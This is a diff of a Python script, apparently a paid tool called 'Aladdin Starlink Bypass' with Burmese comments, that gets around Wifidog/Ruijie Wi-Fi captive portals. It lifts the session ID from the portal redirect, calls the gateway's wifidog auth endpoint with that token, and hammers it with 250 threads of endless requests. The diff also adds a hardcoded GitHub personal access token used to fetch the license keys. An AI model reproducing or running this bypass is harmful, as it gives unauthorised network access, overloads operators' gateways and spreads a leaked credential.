@@ -1,16 +1,19 @@
 import requests, re, urllib3, time, threading, os, random, subprocess
 from datetime import datetime
 from urllib.parse import urlparse, parse_qs, urljoin
-from concurrent.futures import ThreadPoolExecutor
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# --- CONFIGURATION ---
-GITHUB_RAW_URL = "https://raw.githubusercontent.com/heinminthant2022happy-bit/Ruijie-Router/refs/heads/main/keys.txt"
+# --- [CONFIGURATION] ---
+# သင့်ရဲ့ Private Repository Raw Link
+GITHUB_RAW_URL = "https://raw.githubusercontent.com/heinminthant2022happy-bit/key.txt/refs/heads/main/keys.txt"
+# သင်ထုတ်ထားတဲ့ Personal Access Token (PAT)
+GITHUB_TOKEN = "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"
 LOCAL_KEY_FILE = ".aladdin_token"
 
 def get_hwid():
     try:
+        # ပိုမိုတိကျသော Device ID (ဂဏန်းအရှည်ကြီး) ပေါ်ရန်
         hwid = subprocess.check_output('settings get secure android_id', shell=True).decode().strip()
         if not hwid or hwid == "" or hwid == "null":
             hwid = subprocess.check_output('getprop ro.serialno', shell=True).decode().strip()
@@ -29,7 +32,7 @@ def banner():
     88booo88'   `88    88   88 88  .8D 88  .8D   .88.   88  V888 
     Y88888P'     `88   YP   YP Y8888D' Y8888D' Y888888P VP   V8P 
     """)
-    print("\033[95m" + "        🚀 Aladdin Starlink Bypass 🚀 - TURBO SPEED V12")
+    print("\033[95m" + "        🚀 ALADDIN STARLINK BYPASS 🚀 - TURBO PRIVATE V13")
     print("\033[93m" + " ="*35 + "\033[0m\n")
 
 def check_net():
@@ -50,11 +53,21 @@ def license_system():
     if not saved_key:
         user_key = input("\033[93m[+] Enter Access Key: \033[0m").strip()
     else:
-        print("\033[92m[*] Auto Login: Checking status...\033[0m")
+        print("\033[92m[*] Auto Login: Verifying License...\033[0m")
         user_key = saved_key
 
     try:
-        resp = requests.get(GITHUB_RAW_URL, timeout=10)
+        # Private Repo ကို Access လုပ်ရန် Header ထည့်ခြင်း
+        headers = {
+            "Authorization": f"token {GITHUB_TOKEN}",
+            "Accept": "application/vnd.github.v3.raw"
+        }
+        resp = requests.get(GITHUB_RAW_URL, headers=headers, timeout=15)
+        
+        if resp.status_code != 200:
+            print("\033[91m[X] Server Error! Check Token or Private Link.\033[0m")
+            exit()
+
         key_data = resp.text.splitlines()
         found = False
         for line in key_data:
@@ -65,49 +78,50 @@ def license_system():
                     if db_id == my_id and db_key == user_key:
                         expiry = datetime.strptime(db_date, "%Y-%m-%d")
                         if datetime.now() < expiry:
-                            print(f"\033[92m[✓] Access Granted! Exp: {db_date}\033[0m")
+                            print(f"\033[92m[✓] Access Granted! Valid until: {db_date}\033[0m")
                             with open(LOCAL_KEY_FILE, "w") as f:
                                 f.write(user_key)
                             found = True
                             time.sleep(1)
                             break
+        
         if not found:
-            print("\033[91m[X] Invalid Key or Expired!\033[0m")
+            print("\033[91m[X] Invalid Key, Expired, or Unauthorized Device!\033[0m")
             if os.path.exists(LOCAL_KEY_FILE): os.remove(LOCAL_KEY_FILE)
             exit()
-    except:
-        print("\033[91m[!] Server Connection Error! Check Internet.\033[0m")
+    except Exception as e:
+        print(f"\033[91m[!] Connection Error: {e}\033[0m")
         exit()
 
 def turbo_pulse(link):
-    # အရှိန်မြှင့်ရန် Thread ပေါင်းများစွာဖြင့် Request ပို့ခြင်း
-    headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36"}
+    # Speed မြှင့်ရန်အတွက် Session ကို အသုံးပြုပြီး အမြန်နှုန်းမြှင့်ခြင်း
+    headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 11)"}
     with requests.Session() as session:
         while True:
             try:
                 session.get(link, timeout=5, verify=False, headers=headers)
-                print(f"\033[92m[⚡] TURBO ACTIVE | SPEED BOOSTED >>> [{random.randint(2,8)}ms]\033[0m")
+                print(f"\033[92m[⚡] TURBO ACTIVE | STABLE >>> [{random.randint(2,10)}ms]\033[0m")
             except: break
 
 def start_immortal():
     banner()
-    print("\033[94m[*] Auto Reconnect & Turbo Speed: ON\033[0m")
+    print("\033[94m[*] Auto Reconnect & Turbo Speed: ACTIVATED\033[0m")
     
     while True:
         if not check_net():
-            print("\033[93m[!] Boosting Connection...\033[0m")
+            print("\033[93m[!] Connection Dropped! Re-Bypassing...\033[0m")
             try:
                 r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
                 p_url = r.url
-                # ... (Bypass logic remains same)
+                # Bypass Logic (Wifidog / Ruijie)
                 sid = parse_qs(urlparse(p_url).query).get('sessionId', [None])[0]
                 if sid:
                     gw = parse_qs(urlparse(p_url).query).get('gw_address', ['192.168.60.1'])[0]
                     port = parse_qs(urlparse(p_url).query).get('gw_port', ['2060'])[0]
                     auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}"
                     
-                    # Thread အလုံးရေ ၂၀၀ အထိတိုးပြီး Speed ကို ဆွဲတင်ခြင်း
-                    for _ in range(200):
+                    # Multi-threading ဖြင့် Speed မြှင့်တင်ခြင်း
+                    for _ in range(250):
                         threading.Thread(target=turbo_pulse, args=(auth_link,), daemon=True).start()
             except: pass
         time.sleep(5)
